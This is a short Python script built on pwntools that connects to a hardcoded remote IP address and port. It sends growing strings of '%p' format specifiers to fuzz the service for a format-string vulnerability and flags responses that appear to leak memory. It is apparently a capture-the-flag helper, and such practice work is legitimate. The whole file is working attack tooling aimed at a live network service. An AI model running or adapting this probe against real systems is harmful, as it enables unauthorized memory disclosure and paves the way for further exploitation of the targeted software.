from pwn import *
import string

ip = "43.205.113.100"
port = 8528

# Max number of %p to try per payload
max_depth = 20

def is_printable(s):
    # Allow printable ASCII and common punctuation
    return all(chr(c) in string.printable for c in s)

def fuzz_format_string():
    for i in range(1, max_depth + 1):
        payload = '%p' * i
        log.info(f"Trying with payload length {i}: {payload}")

        try:
            conn = remote(ip, port)
            conn.recvuntil(b':')  # Adjust based on actual prompt
            conn.sendline(b'y')   # Send initial trigger if needed

            conn.recvuntil(b':')  # Adjust again if another prompt
            conn.sendline(payload.encode())

            response = conn.recv(timeout=2)
            conn.close()

            print(f"[{i}] Payload: {payload}")
            print(f"[{i}] Response: {response}")

            if any(is_printable(p.encode()) for p in response.decode(errors="ignore").split()):
                log.success(f"[*] Possible leak found with %p * {i}")
                print(response.decode(errors="ignore"))

        except Exception as e:
            log.failure(f"Error during fuzz with %p * {i}: {e}")

if __name__ == "__main__":
    fuzz_format_string()
